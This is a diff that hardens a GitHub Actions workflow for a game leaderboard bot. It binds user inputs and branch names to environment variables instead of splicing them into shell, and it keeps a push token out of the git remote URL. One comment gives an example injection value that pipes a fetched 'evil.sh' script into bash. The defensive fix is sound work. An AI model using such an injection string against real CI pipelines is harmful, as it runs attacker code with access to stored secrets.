@@ -61,24 +61,34 @@ jobs:
           WCL_CLIENT_SECRET: ${{ secrets.WCL_CLIENT_SECRET }}
           DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
           DISCORD_BOT_TOKEN: ${{ secrets.DISCORD_BOT_TOKEN }}
+          # The dispatch inputs are free text. They are bound to env vars here
+          # and read as "$VAR" below — never spliced into the script body with
+          # ${{ }}. Otherwise a roast of  '; curl evil.sh | bash; #  runs as
+          # shell in this step, which is the step that holds every secret.
+          IN_ROAST: ${{ github.event.inputs.roast }}
+          IN_ROAST_WINNER: ${{ github.event.inputs.roast_winner }}
+          IN_ROAST_TARGET: ${{ github.event.inputs.roast_target }}
+          IN_DIFFICULTY: ${{ github.event.inputs.difficulty }}
+          IN_LOOKBACK: ${{ github.event.inputs.lookback }}
+          IN_DRY_RUN: ${{ github.event.inputs.dry_run }}
         run: |
           args=()
-          if [ -n "${{ github.event.inputs.roast }}" ]; then
-            args+=(--roast "${{ github.event.inputs.roast }}")
+          if [ -n "$IN_ROAST" ]; then
+            args+=(--roast "$IN_ROAST")
           fi
-          if [ -n "${{ github.event.inputs.roast_winner }}" ]; then
-            args+=(--roast-winner "${{ github.event.inputs.roast_winner }}")
+          if [ -n "$IN_ROAST_WINNER" ]; then
+            args+=(--roast-winner "$IN_ROAST_WINNER")
           fi
-          if [ -n "${{ github.event.inputs.roast_target }}" ]; then
-            args+=(--roast-target "${{ github.event.inputs.roast_target }}")
+          if [ -n "$IN_ROAST_TARGET" ]; then
+            args+=(--roast-target "$IN_ROAST_TARGET")
           fi
-          if [ -n "${{ github.event.inputs.difficulty }}" ]; then
-            args+=(--difficulty ${{ github.event.inputs.difficulty }})
+          if [ -n "$IN_DIFFICULTY" ]; then
+            args+=(--difficulty "$IN_DIFFICULTY")
           fi
-          if [ -n "${{ github.event.inputs.lookback }}" ]; then
-            args+=(--lookback ${{ github.event.inputs.lookback }})
+          if [ -n "$IN_LOOKBACK" ]; then
+            args+=(--lookback "$IN_LOOKBACK")
           fi
-          if [ "${{ github.event.inputs.dry_run }}" == "true" ]; then
+          if [ "$IN_DRY_RUN" == "true" ]; then
             args+=(--dry-run)
           fi
           python leaderboard.py "${args[@]}"
@@ -100,10 +110,15 @@ jobs:
             echo "display.web_board.repo not set in config.yml; skipping."
             exit 0
           fi
-          remote="https://x-access-token:${WEB_BOARD_TOKEN}@github.com/${repo}.git"
+          remote="https://github.com/${repo}.git"
+          # The token goes in an Authorization header, not in the remote URL.
+          # A URL-embedded token gets persisted into pages/.git/config on the
+          # runner's disk, where any later step -- or an uploaded artifact --
+          # can read it back out. The header form leaves nothing on disk.
+          auth="AUTHORIZATION: basic $(printf 'x-access-token:%s' "$WEB_BOARD_TOKEN" | base64 -w0)"
           # Preserve history: build on the existing gh-pages so the week
           # archive accumulates instead of being wiped every Tuesday.
-          if git clone -q --depth 1 --branch gh-pages "$remote" pages 2>/dev/null; then
+          if git -c http.extraheader="$auth" clone -q --depth 1 --branch gh-pages "$remote" pages 2>/dev/null; then
             echo "Extending existing gh-pages."
           else
             mkdir -p pages
@@ -128,13 +143,15 @@ jobs:
             echo "Web board unchanged; nothing to publish."
           else
             git commit -q -m "Weekly web board ${week}"
-            git push -q "$remote" gh-pages
+            git -c http.extraheader="$auth" push -q "$remote" gh-pages
             echo "Web board published (archive week ${week})."
           fi
 
       - name: Commit roster cache and board state
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Branch names may contain shell metacharacters; bind, don't splice.
+          REF_NAME: ${{ github.ref_name }}
         run: |
           git config --local user.email "action@github.com"
           git config --local user.name "GitHub Action"
@@ -144,7 +161,7 @@ jobs:
             echo "No cache/state changes to commit."
           else
             git commit -m "Update roster cache and board state [skip ci]"
-            if git pull --rebase origin ${{ github.ref_name }}; then
+            if git pull --rebase origin "$REF_NAME"; then
               git push
             else
               git checkout --ours roster_cache.json board_state.json
